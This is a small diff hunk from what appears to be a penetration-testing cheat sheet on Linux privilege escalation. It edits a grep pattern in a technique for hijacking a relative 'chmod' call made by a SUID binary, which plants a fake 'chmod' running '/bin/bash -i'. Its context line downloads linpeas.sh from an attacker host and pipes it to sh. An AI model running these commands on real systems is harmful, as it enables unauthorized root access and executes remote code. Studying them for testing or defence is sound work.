@@ -1239,7 +1239,7 @@ curl -s http://$MYIP:8888/linux/linpeas.sh | sh
 
 +---------- None Absolute Path (suid) ----------+
 strace -f -o file /usr/local/bin/suid-name
-cat file | grep -rine '"chmod"'
+cat file | grep -rine 'chmod '
 env -i bash --norc --noprofile
 TEMPFOLDER=$(mktemp -d)
 printf %s '/bin/bash -i' > $TEMPFOLDER/chmod
